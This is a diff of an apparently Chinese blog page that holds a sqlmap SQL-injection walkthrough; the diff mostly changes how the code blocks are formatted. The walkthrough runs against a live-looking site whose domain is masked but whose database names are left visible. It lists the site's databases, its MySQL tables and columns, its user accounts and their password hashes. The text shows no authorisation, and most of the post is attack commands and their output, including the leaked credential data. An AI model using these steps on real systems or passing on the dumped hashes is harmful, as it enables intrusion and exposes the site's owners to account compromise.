@@ -365,7 +365,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    593
+                    735
                 </div>
                 
 
@@ -387,27 +387,149 @@
 <p><code>sqlmap.py -u &quot;https://www.xxx.com/subcat.php?id=2&quot;</code></p>
 <p>查看当前数据库。</p>
 <p><code>sqlmap.py -u &quot;https://www.xxx.com/subcat.php?id=2&quot; --current-db</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;https:&#x2F;&#x2F;www.xxx.com&#x2F;subcat.php?id&#x3D;2&quot; --current-db</span><br><span class="line">current database: &#39;bible_history&#39;</span><br></pre></td></tr></table></figure>
-
-<p>查看所有数据库。</p>
+<pre><code>sqlmap.py -u &quot;https://www.xxx.com/subcat.php?id=2&quot; --current-db
+current database: &#39;bible_history&#39;</code></pre><p>查看所有数据库。</p>
 <p><code>sqlmap.py -u &quot;https://www.xxx.com/subcat.php?id=2&quot; --dbs</code></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "https://www.xxx.com/subcat.php?id=2" --dbs</span><br><span class="line">available databases [18]:</span><br><span class="line">[] ancient_questions</span><br><span class="line">[] axiom_sewers</span><br><span class="line">[] bible_glossary</span><br><span class="line">[] bible_history</span><br><span class="line">[] grosh</span><br><span class="line">[] hmc_hmcinspire</span><br><span class="line">[] infofaq</span><br><span class="line">[] information_schema</span><br><span class="line">[] kidsbibledictionary</span><br><span class="line">[] kidsmaps</span><br><span class="line">[] mysql</span><br><span class="line">[] performance_schema</span><br><span class="line">[] portlandroofrepair</span><br><span class="line">[] russellcraft</span><br><span class="line">[] rusty_ancient</span><br><span class="line">[] rusty_biblemaps</span><br><span class="line">[] rusty_even</span><br><span class="line">[] w2605a</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">sqlmap.py -u &quot;https://www.xxx.com/subcat.php?id=2&quot; --dbs
+available databases [18]:
+[] ancient_questions
+[] axiom_sewers
+[] bible_glossary
+[] bible_history
+[] grosh
+[] hmc_hmcinspire
+[] infofaq
+[] information_schema
+[] kidsbibledictionary
+[] kidsmaps
+[] mysql
+[] performance_schema
+[] portlandroofrepair
+[] russellcraft
+[] rusty_ancient
+[] rusty_biblemaps
+[] rusty_even
+[] w2605a</code></pre>
 <p>列出数据库中的所有表。</p>
 <p><code>sqlmap.py -u &quot;https://www.xxx.com/subcat.php?id=2&quot; --tables -D mysql</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;https:&#x2F;&#x2F;www.xxx.com&#x2F;subcat.php?id&#x3D;2&quot; --tables -D mysql</span><br><span class="line">+---------------------------+</span><br><span class="line">| user                      |</span><br><span class="line">| column_stats              |</span><br><span class="line">| columns_priv              |</span><br><span class="line">| db                        |</span><br><span class="line">| event                     |</span><br><span class="line">| func                      |</span><br><span class="line">| general_log               |</span><br><span class="line">| gtid_slave_pos            |</span><br><span class="line">| help_category             |</span><br><span class="line">| help_keyword              |</span><br><span class="line">| help_relation             |</span><br><span class="line">| help_topic                |</span><br><span class="line">| host                      |</span><br><span class="line">| index_stats               |</span><br><span class="line">| innodb_index_stats        |</span><br><span class="line">| innodb_table_stats        |</span><br><span class="line">| plugin                    |</span><br><span class="line">| proc                      |</span><br><span class="line">| procs_priv                |</span><br><span class="line">| proxies_priv              |</span><br><span class="line">| roles_mapping             |</span><br><span class="line">| servers                   |</span><br><span class="line">| slow_log                  |</span><br><span class="line">| table_stats               |</span><br><span class="line">| tables_priv               |</span><br><span class="line">| time_zone                 |</span><br><span class="line">| time_zone_leap_second     |</span><br><span class="line">| time_zone_name            |</span><br><span class="line">| time_zone_transition      |</span><br><span class="line">| time_zone_transition_type |</span><br><span class="line">| transaction_registry      |</span><br></pre></td></tr></table></figure>
-
-<p>列出表中的所有字段</p>
+<pre><code>sqlmap.py -u &quot;https://www.xxx.com/subcat.php?id=2&quot; --tables -D mysql
++---------------------------+
+| user                      |
+| column_stats              |
+| columns_priv              |
+| db                        |
+| event                     |
+| func                      |
+| general_log               |
+| gtid_slave_pos            |
+| help_category             |
+| help_keyword              |
+| help_relation             |
+| help_topic                |
+| host                      |
+| index_stats               |
+| innodb_index_stats        |
+| innodb_table_stats        |
+| plugin                    |
+| proc                      |
+| procs_priv                |
+| proxies_priv              |
+| roles_mapping             |
+| servers                   |
+| slow_log                  |
+| table_stats               |
+| tables_priv               |
+| time_zone                 |
+| time_zone_leap_second     |
+| time_zone_name            |
+| time_zone_transition      |
+| time_zone_transition_type |
+| transaction_registry      |</code></pre><p>列出表中的所有字段</p>
 <p><code>sqlmap.py -u &quot;https://www.xxx.com/subcat.php?id=2&quot; --columns -T user -D mysql</code></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "https://www.xxx.com/subcat.php?id=2" --columns -T user -D mysql</span><br><span class="line">[47 columns]</span><br><span class="line">+------------------------+-----------------------------------+</span><br><span class="line">| Column                 | Type                              |</span><br><span class="line">+------------------------+-----------------------------------+</span><br><span class="line">| User                   | char(80)                          |</span><br><span class="line">| Alter_priv             | enum('N','Y')                     |</span><br><span class="line">| Alter_routine_priv     | enum('N','Y')                     |</span><br><span class="line">| authentication_string  | text                              |</span><br><span class="line">| Create_priv            | enum('N','Y')                     |</span><br><span class="line">| Create_routine_priv    | enum('N','Y')                     |</span><br><span class="line">| Create_tablespace_priv | enum('N','Y')                     |</span><br><span class="line">| Create_tmp_table_priv  | enum('N','Y')                     |</span><br><span class="line">| Create_user_priv       | enum('N','Y')                     |</span><br><span class="line">| Create_view_priv       | enum('N','Y')                     |</span><br><span class="line">| default_role           | char(80)                          |</span><br><span class="line">| Delete_history_priv    | enum('N','Y')                     |</span><br><span class="line">| Delete_priv            | enum('N','Y')                     |</span><br><span class="line">| Drop_priv              | enum('N','Y')                     |</span><br><span class="line">| Event_priv             | enum('N','Y')                     |</span><br><span class="line">| Execute_priv           | enum('N','Y')                     |</span><br><span class="line">| File_priv              | enum('N','Y')                     |</span><br><span class="line">| Grant_priv             | enum('N','Y')                     |</span><br><span class="line">| Host                   | char(60)                          |</span><br><span class="line">| Index_priv             | enum('N','Y')                     |</span><br><span class="line">| Insert_priv            | enum('N','Y')                     |</span><br><span class="line">| is_role                | enum('N','Y')                     |</span><br><span class="line">| Lock_tables_priv       | enum('N','Y')                     |</span><br><span class="line">| max_connections        | int(11) unsigned                  |</span><br><span class="line">| max_questions          | int(11) unsigned                  |</span><br><span class="line">| max_statement_time     | decimal(12,6)                     |</span><br><span class="line">| max_updates            | int(11) unsigned                  |</span><br><span class="line">| max_user_connections   | int(11)                           |</span><br><span class="line">| Password               | char(41)                          |</span><br><span class="line">| password_expired       | enum('N','Y')                     |</span><br><span class="line">| plugin                 | char(64)                          |</span><br><span class="line">| Process_priv           | enum('N','Y')                     |</span><br><span class="line">| References_priv        | enum('N','Y')                     |</span><br><span class="line">| Reload_priv            | enum('N','Y')                     |</span><br><span class="line">| Repl_client_priv       | enum('N','Y')                     |</span><br><span class="line">| Repl_slave_priv        | enum('N','Y')                     |</span><br><span class="line">| Select_priv            | enum('N','Y')                     |</span><br><span class="line">| Show_db_priv           | enum('N','Y')                     |</span><br><span class="line">| Show_view_priv         | enum('N','Y')                     |</span><br><span class="line">| Shutdown_priv          | enum('N','Y')                     |</span><br><span class="line">| ssl_cipher             | blob                              |</span><br><span class="line">| ssl_type               | enum('','ANY','X509','SPECIFIED') |</span><br><span class="line">| Super_priv             | enum('N','Y')                     |</span><br><span class="line">| Trigger_priv           | enum('N','Y')                     |</span><br><span class="line">| Update_priv            | enum('N','Y')                     |</span><br><span class="line">| x509_issuer            | blob                              |</span><br><span class="line">| x509_subject           | blob                              |</span><br><span class="line">+------------------------+-----------------------------------+</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">sqlmap.py -u &quot;https://www.xxx.com/subcat.php?id=2&quot; --columns -T user -D mysql
+[47 columns]
++------------------------+-----------------------------------+
+| Column                 | Type                              |
++------------------------+-----------------------------------+
+| User                   | char(80)                          |
+| Alter_priv             | enum(&#39;N&#39;,&#39;Y&#39;)                     |
+| Alter_routine_priv     | enum(&#39;N&#39;,&#39;Y&#39;)                     |
+| authentication_string  | text                              |
+| Create_priv            | enum(&#39;N&#39;,&#39;Y&#39;)                     |
+| Create_routine_priv    | enum(&#39;N&#39;,&#39;Y&#39;)                     |
+| Create_tablespace_priv | enum(&#39;N&#39;,&#39;Y&#39;)                     |
+| Create_tmp_table_priv  | enum(&#39;N&#39;,&#39;Y&#39;)                     |
+| Create_user_priv       | enum(&#39;N&#39;,&#39;Y&#39;)                     |
+| Create_view_priv       | enum(&#39;N&#39;,&#39;Y&#39;)                     |
+| default_role           | char(80)                          |
+| Delete_history_priv    | enum(&#39;N&#39;,&#39;Y&#39;)                     |
+| Delete_priv            | enum(&#39;N&#39;,&#39;Y&#39;)                     |
+| Drop_priv              | enum(&#39;N&#39;,&#39;Y&#39;)                     |
+| Event_priv             | enum(&#39;N&#39;,&#39;Y&#39;)                     |
+| Execute_priv           | enum(&#39;N&#39;,&#39;Y&#39;)                     |
+| File_priv              | enum(&#39;N&#39;,&#39;Y&#39;)                     |
+| Grant_priv             | enum(&#39;N&#39;,&#39;Y&#39;)                     |
+| Host                   | char(60)                          |
+| Index_priv             | enum(&#39;N&#39;,&#39;Y&#39;)                     |
+| Insert_priv            | enum(&#39;N&#39;,&#39;Y&#39;)                     |
+| is_role                | enum(&#39;N&#39;,&#39;Y&#39;)                     |
+| Lock_tables_priv       | enum(&#39;N&#39;,&#39;Y&#39;)                     |
+| max_connections        | int(11) unsigned                  |
+| max_questions          | int(11) unsigned                  |
+| max_statement_time     | decimal(12,6)                     |
+| max_updates            | int(11) unsigned                  |
+| max_user_connections   | int(11)                           |
+| Password               | char(41)                          |
+| password_expired       | enum(&#39;N&#39;,&#39;Y&#39;)                     |
+| plugin                 | char(64)                          |
+| Process_priv           | enum(&#39;N&#39;,&#39;Y&#39;)                     |
+| References_priv        | enum(&#39;N&#39;,&#39;Y&#39;)                     |
+| Reload_priv            | enum(&#39;N&#39;,&#39;Y&#39;)                     |
+| Repl_client_priv       | enum(&#39;N&#39;,&#39;Y&#39;)                     |
+| Repl_slave_priv        | enum(&#39;N&#39;,&#39;Y&#39;)                     |
+| Select_priv            | enum(&#39;N&#39;,&#39;Y&#39;)                     |
+| Show_db_priv           | enum(&#39;N&#39;,&#39;Y&#39;)                     |
+| Show_view_priv         | enum(&#39;N&#39;,&#39;Y&#39;)                     |
+| Shutdown_priv          | enum(&#39;N&#39;,&#39;Y&#39;)                     |
+| ssl_cipher             | blob                              |
+| ssl_type               | enum(&#39;&#39;,&#39;ANY&#39;,&#39;X509&#39;,&#39;SPECIFIED&#39;) |
+| Super_priv             | enum(&#39;N&#39;,&#39;Y&#39;)                     |
+| Trigger_priv           | enum(&#39;N&#39;,&#39;Y&#39;)                     |
+| Update_priv            | enum(&#39;N&#39;,&#39;Y&#39;)                     |
+| x509_issuer            | blob                              |
+| x509_subject           | blob                              |
++------------------------+-----------------------------------+</code></pre>
 <p>列出所有数据</p>
 <p><code>sqlmap.py -u &quot;https://www.xxx.com/subcat.php?id=2&quot; --dump -C user -T user -D mysql</code></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "https://www.xxx.com/subcat.php?id=2" --dump -C user -T user -D mysql</span><br><span class="line">Database: mysql</span><br><span class="line">Table: user</span><br><span class="line">[6 entries]</span><br><span class="line">+------------------+</span><br><span class="line">| user             |</span><br><span class="line">+------------------+</span><br><span class="line">| debian-sys-maint |</span><br><span class="line">| infofaq          |</span><br><span class="line">| root             |</span><br><span class="line">| root             |</span><br><span class="line">| root             |</span><br><span class="line">| rusty            |</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">sqlmap.py -u &quot;https://www.xxx.com/subcat.php?id=2&quot; --dump -C user -T user -D mysql
+Database: mysql
+Table: user
+[6 entries]
++------------------+
+| user             |
++------------------+
+| debian-sys-maint |
+| infofaq          |
+| root             |
+| root             |
+| root             |
+| rusty            |
++------------------+</code></pre>
 <p><code>sqlmap.py -u &quot;https://www.xxx.com/subcat.php?id=2&quot; --dump -C password -T user -D mysql</code></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "https://www.xxx.com/subcat.php?id=2" --dump -C password -T user -D mysql</span><br><span class="line">Database: mysql</span><br><span class="line">Table: user</span><br><span class="line">[6 entries]</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| password                                  |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| *7A3ACC64D7B725A0680FFA56DC07AA09004884CF |</span><br><span class="line">| *CE54DB2032962B216435BB5F02709003A9BB1C63 |</span><br><span class="line">| *EBB9DF1F91F4422221737626BD5855965274EEBF |</span><br><span class="line">| *EBB9DF1F91F4422221737626BD5855965274EEBF |</span><br><span class="line">| *EBB9DF1F91F4422221737626BD5855965274EEBF |</span><br><span class="line">| *EEC1F40CA2B7988614C13911FD576B685201396B |</span><br><span class="line">+-------------------------------------------+</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">sqlmap.py -u &quot;https://www.xxx.com/subcat.php?id=2&quot; --dump -C password -T user -D mysql
+Database: mysql
+Table: user
+[6 entries]
++-------------------------------------------+
+| password                                  |
++-------------------------------------------+
+| *7A3ACC64D7B725A0680FFA56DC07AA09004884CF |
+| *CE54DB2032962B216435BB5F02709003A9BB1C63 |
+| *EBB9DF1F91F4422221737626BD5855965274EEBF |
+| *EBB9DF1F91F4422221737626BD5855965274EEBF |
+| *EBB9DF1F91F4422221737626BD5855965274EEBF |
+| *EEC1F40CA2B7988614C13911FD576B685201396B |
++-------------------------------------------+</code></pre>
 
             </div>
             <hr/>
@@ -806,7 +928,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">19.2k</span>&nbsp;字
+                class="white-color">19.7k</span>&nbsp;字
             
             
             
